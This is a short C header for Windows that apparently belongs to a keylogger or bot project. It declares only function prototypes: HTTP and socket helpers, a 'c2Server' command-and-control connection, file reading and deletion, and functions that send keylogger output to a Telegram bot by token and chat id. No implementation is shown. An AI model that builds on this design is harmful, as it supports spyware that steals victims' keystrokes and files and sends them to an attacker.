#ifndef NETWORK_H
#define NETWORK_H

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <winsock2.h>
void zero(char *buffer);
  HINTERNET  sendrequest(LPCSTR domain,int port,LPCSTR URI,LPCSTR verb,const char* buffer);
  DWORD  get_status_code(HINTERNET hfile);//
  char * get_reponse(HINTERNET file);
  SOCKET buildsocket();
  BOOL c2Server(char *ip,int port,SOCKET s);
  void  conect_web(char *domain,int port,SOCKET socket);
  void web_send(char *request,SOCKET web,char *bufer);
void  http_close(HINTERNET *hinternt,HINTERNET *conect, HINTERNET *request);
char*  read_file();
BOOL delete_file(char *name);
int send_doc_keylloger(const char *id,const char *bot_token,char *name);
void telegram_log(const char *token,const char *id,const char *name);
#endif
